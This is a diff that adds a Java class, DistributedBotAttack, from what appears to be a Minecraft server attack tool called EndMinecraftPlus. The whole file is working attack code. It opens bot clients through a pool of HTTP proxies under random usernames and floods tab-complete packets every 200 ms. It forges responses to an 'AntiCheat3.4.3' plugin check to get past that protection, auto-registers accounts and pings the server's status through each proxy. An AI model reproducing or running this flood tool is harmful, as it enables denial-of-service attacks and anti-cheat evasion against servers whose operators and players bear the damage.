@@ -1,0 +1,204 @@
+package luohuayu.EndMinecraftPlus.tasks.attack;
+
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.InetSocketAddress;
+import java.net.Proxy;
+import java.net.Socket;
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+
+import org.spacehq.mc.protocol.MinecraftProtocol;
+import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
+import org.spacehq.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
+import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
+import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
+import org.spacehq.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
+import org.spacehq.packetlib.Client;
+import org.spacehq.packetlib.event.session.ConnectedEvent;
+import org.spacehq.packetlib.event.session.DisconnectedEvent;
+import org.spacehq.packetlib.event.session.DisconnectingEvent;
+import org.spacehq.packetlib.event.session.PacketReceivedEvent;
+import org.spacehq.packetlib.event.session.PacketSentEvent;
+import org.spacehq.packetlib.event.session.SessionListener;
+import org.spacehq.packetlib.tcp.TcpSessionFactory;
+
+import luohuayu.ACProtocol.ACProtocol;
+import luohuayu.EndMinecraftPlus.Utils;
+import luohuayu.EndMinecraftPlus.proxy.ProxyPool;
+import luohuayu.MCForgeProtocol.MCForge;
+
+public class DistributedBotAttack extends IAttack {
+	private Thread mainThread;
+	private Thread tabThread;
+	private Thread taskThread;
+	
+	private List<Client> clients=new ArrayList<Client>();
+	private ExecutorService pool=Executors.newCachedThreadPool();
+	
+	private ACProtocol acp=new ACProtocol();
+	
+	private long starttime;
+	
+	public DistributedBotAttack(int time,int maxconnect,int joinsleep,boolean motdbefore,boolean tab,HashMap<String,String> modList) {
+		super(time,maxconnect,joinsleep,motdbefore,tab,modList);
+	}
+
+	public void start(final String ip,final int port) {
+		this.starttime=System.currentTimeMillis();
+		
+		mainThread=new Thread(()->{
+			while(true) {
+				try {
+					cleanClients();
+					createClients(ip,port);
+					Utils.sleep(5000);
+					
+					if(this.attack_time>0&&(System.currentTimeMillis()-this.starttime)/1000>this.attack_time) {
+						clients.forEach(c->{
+							c.getSession().disconnect("");
+						});
+						stop();
+						return;
+					}
+				}catch(Exception e){
+					Utils.log("BotThread",e.getMessage());
+				}
+			}
+		});
+
+		if(this.attack_tab) {
+			tabThread=new Thread(()-> {
+				while(true) {
+					synchronized (clients) {
+						clients.forEach(c->{
+							if(c.getSession().isConnected()) {
+								c.getSession().send(new ClientTabCompletePacket("/"));
+							}
+						});
+					}
+					Utils.sleep(200);
+				}
+			});
+		}
+		
+		mainThread.start();
+		if(tabThread!=null) tabThread.start();
+		if(taskThread!=null) taskThread.start();
+	}
+
+	@SuppressWarnings("deprecation")
+	public void stop() {
+		mainThread.stop();
+		if(tabThread!=null) tabThread.stop();
+		if(taskThread!=null) taskThread.stop();
+	}
+	
+	private void cleanClients() {
+		List<Client> waitRemove=new ArrayList<Client>();
+		synchronized (clients) {
+			clients.forEach(c->{
+				if(c.getSession().isConnected()) {
+					waitRemove.add(c);
+				}
+			});
+			clients.removeAll(waitRemove);
+		}
+	}
+	
+	private void createClients(final String ip,int port) {
+		synchronized(ProxyPool.proxys) {
+			ProxyPool.proxys.forEach(p->{
+				try {
+					String[] _p=p.split(":");
+					Proxy proxy=new Proxy(Proxy.Type.HTTP,new InetSocketAddress(_p[0],Integer.parseInt(_p[1])));
+					Client client=createClient(ip, port,Utils.getRandomString(4,12),proxy);
+					client.getSession().setCompressionThreshold(0);
+					synchronized (clients) {
+						clients.add(client);
+					}
+					
+					pool.submit(()->{
+						if(this.attack_motdbefore) getMotd(proxy,ip,port);
+						client.getSession().connect();
+					});
+					
+					if(this.attack_maxconnect>0&&clients.size()>this.attack_maxconnect) return;
+					if(this.attack_joinsleep>0) Utils.sleep(attack_joinsleep);
+				}catch(Exception e){
+					Utils.log("BotThread/CreateClients",e.getMessage());
+				}
+			});
+		}
+	}
+	
+	public Client createClient(final String ip,int port,final String username,Proxy proxy) {
+		Client client=new Client(ip,port,new MinecraftProtocol(username), new TcpSessionFactory(proxy));
+		MCForge forge=new MCForge(client.getSession(),this.modList);
+		client.getSession().addListener(new SessionListener() {
+			public void packetReceived(PacketReceivedEvent e) {
+				forge.handle(e.getSession(),e.getPacket());
+				if (e.getPacket() instanceof ServerPluginMessagePacket) {
+					ServerPluginMessagePacket packet=e.getPacket();
+					switch(packet.getChannel()) {
+						case "AntiCheat3.4.3":
+							String code=acp.uncompress(packet.getData());
+							byte[] checkData=acp.getCheckData("AntiCheat.jar",code,new String[] {"44f6bc86a41fa0555784c255e3174260"});
+							e.getSession().send(new ClientPluginMessagePacket("AntiCheat3.4.3",checkData));
+							break;
+						default:
+ 					}
+				}else if (e.getPacket() instanceof ServerJoinGamePacket) {
+					Utils.log("Client","[连接成功]["+username+"]");
+					new Thread(()-> {
+						String pwd=Utils.getRandomString(8,12);
+						Utils.sleep(5000);
+						client.getSession().send(new ClientChatPacket("/register "+pwd+" "+pwd));
+					}).start();
+				}
+			}
+			public void packetSent(PacketSentEvent e){}
+			public void connected(ConnectedEvent e){}
+			public void disconnecting(DisconnectingEvent e){}
+			public void disconnected(DisconnectedEvent e){
+				String msg;
+				if(e.getCause()!=null) {
+					msg=e.getCause().getMessage();
+				}else{
+					msg=e.getReason();
+				}
+				Utils.log("Client","[断开连接]["+username+"] " +msg);
+			}
+		});
+		return client;
+	}
+	
+	public boolean getMotd(Proxy proxy,String ip,int port) {
+		try {
+			Socket socket=new Socket(proxy);
+			socket.connect(new InetSocketAddress(ip, port));
+			if (socket.isConnected()) {
+				OutputStream out=socket.getOutputStream();
+				InputStream in=socket.getInputStream();
+				out.write(new byte[] {0x07,0x00,0x05,0x01,0x30,0x63,(byte)0xDD,0x01});
+				out.write(new byte[] {0x01,0x00});
+				out.flush();
+				in.read();
+				
+				try {
+					in.close();
+					out.close();
+					socket.close();
+				} catch (IOException e) {}
+				
+				return true;
+			}
+			socket.close();
+		} catch (IOException e) {}
+		return false;
+	}
+}
